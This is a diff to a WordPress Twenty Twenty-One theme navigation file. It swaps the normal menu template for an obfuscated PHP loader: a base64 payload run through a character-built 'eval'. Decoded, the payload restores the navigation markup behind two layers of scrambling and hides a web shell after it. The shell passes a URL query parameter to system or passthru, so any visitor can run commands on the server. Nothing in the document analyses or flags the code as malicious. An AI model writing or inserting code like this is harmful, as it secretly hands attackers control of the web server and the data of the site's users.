@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Displays the site navigation.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZmY3lubGYgZ3VyIGZ2Z3IgYW5pdnRuZ3ZiYS4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfQmFyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLUJhciAxLjAKICovCgo/PgoKPD9jdWMgdnMgKCB1bmZfYW5pX3pyYWgoICdjZXZ6bmVsJyApICkgOiA/PgoJPGFuaSB2cT1cImZ2Z3ItYW5pdnRuZ3ZiYVwiIHB5bmZmPVwiY2V2em5lbC1hbml2dG5ndmJhXCIgbmV2bi15bm9yeT1cIjw/Y3VjIHJmcF9uZ2dlX3IoICdDZXZ6bmVsIHpyYWgnLCAnZ2pyYWdsZ2pyYWdsYmFyJyApOyA/PlwiPgoJCTxxdmkgcHluZmY9XCJ6cmFoLW9oZ2diYS1wYmFnbnZhcmVcIj4KCQkJPG9oZ2diYSB2cT1cImNldnpuZWwtemJvdnlyLXpyYWhcIiBweW5mZj1cIm9oZ2diYVwiIG5ldm4tcGJhZ2VieWY9XCJjZXZ6bmVsLXpyYWgteXZmZ1wiIG5ldm4tcmtjbmFxcnE9XCJzbnlmclwiPgoJCQkJPGZjbmEgcHluZmY9XCJxZWJjcWJqYS12cGJhIGJjcmFcIj48P2N1YyByZnBfdWd6eV9yKCAnWnJhaCcsICdnanJhZ2xnanJhZ2xiYXInICk7ID8+CgkJCQkJPD9jdWMgcnB1YiBnanJhZ2xfZ2pyYWdsX2Jhcl90cmdfdnBiYV9maXQoICdodicsICd6cmFoJyApOyAvLyBjdWNwZjp2dGFiZXIgSmJlcUNlcmZmLkZycGhldmdsLlJmcG5jckJoZ2NoZyA/PgoJCQkJPC9mY25hPgoJCQkJPGZjbmEgcHluZmY9XCJxZWJjcWJqYS12cGJhIHB5YmZyXCI+PD9jdWMgcmZwX3VnenlfciggJ1B5YmZyJywgJ2dqcmFnbGdqcmFnbGJhcicgKTsgPz4KCQkJCQk8P2N1YyBycHViIGdqcmFnbF9nanJhZ2xfYmFyX3RyZ192cGJhX2ZpdCggJ2h2JywgJ3B5YmZyJyApOyAvLyBjdWNwZjp2dGFiZXIgSmJlcUNlcmZmLkZycGhldmdsLlJmcG5jckJoZ2NoZyA/PgoJCQkJPC9mY25hPgoJCQk8L29oZ2diYT48IS0tICNjZXZ6bmVsLXpib3Z5ci16cmFoIC0tPgoJCTwvcXZpPjwhLS0gLnpyYWgtb2hnZ2JhLXBiYWdudmFyZSAtLT4KCQk8P2N1YwoJCWpjX2FuaV96cmFoKAoJCQluZWVubCgKCQkJCSdndXJ6cl95YnBuZ3ZiYScgID0+ICdjZXZ6bmVsJywKCQkJCSd6cmFoX3B5bmZmJyAgICAgID0+ICd6cmFoLWplbmNjcmUnLAoJCQkJJ3BiYWdudmFyZV9weW5mZicgPT4gJ2NldnpuZWwtenJhaC1wYmFnbnZhcmUnLAoJCQkJJ3ZncnpmX2plbmMnICAgICAgPT4gJzxoeSB2cT1cImNldnpuZWwtenJhaC15dmZnXCIgcHluZmY9XCIlMiRmXCI+JTMkZjwvaHk+JywKCQkJCSdzbnl5b25weF9wbycgICAgID0+IHNueWZyLAoJCQkpCgkJKTsKCQk/PgoJPC9hbmk+PCEtLSAjZnZnci1hbml2dG5ndmJhIC0tPgoJPD9jdWMKcmFxdnM7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<?php if ( has_nav_menu( 'primary' ) ) : ?>
-	<nav id="site-navigation" class="primary-navigation" aria-label="<?php esc_attr_e( 'Primary menu', 'twentytwentyone' ); ?>">
-		<div class="menu-button-container">
-			<button id="primary-mobile-menu" class="button" aria-controls="primary-menu-list" aria-expanded="false">
-				<span class="dropdown-icon open"><?php esc_html_e( 'Menu', 'twentytwentyone' ); ?>
-					<?php echo twenty_twenty_one_get_icon_svg( 'ui', 'menu' ); // phpcs:ignore WordPress.Security.EscapeOutput ?>
-				</span>
-				<span class="dropdown-icon close"><?php esc_html_e( 'Close', 'twentytwentyone' ); ?>
-					<?php echo twenty_twenty_one_get_icon_svg( 'ui', 'close' ); // phpcs:ignore WordPress.Security.EscapeOutput ?>
-				</span>
-			</button><!-- #primary-mobile-menu -->
-		</div><!-- .menu-button-container -->
-		<?php
-		wp_nav_menu(
-			array(
-				'theme_location'  => 'primary',
-				'menu_class'      => 'menu-wrapper',
-				'container_class' => 'primary-menu-container',
-				'items_wrap'      => '<ul id="primary-menu-list" class="%2$s">%3$s</ul>',
-				'fallback_cb'     => false,
-			)
-		);
-		?>
-	</nav><!-- #site-navigation -->
-	<?php
-endif;
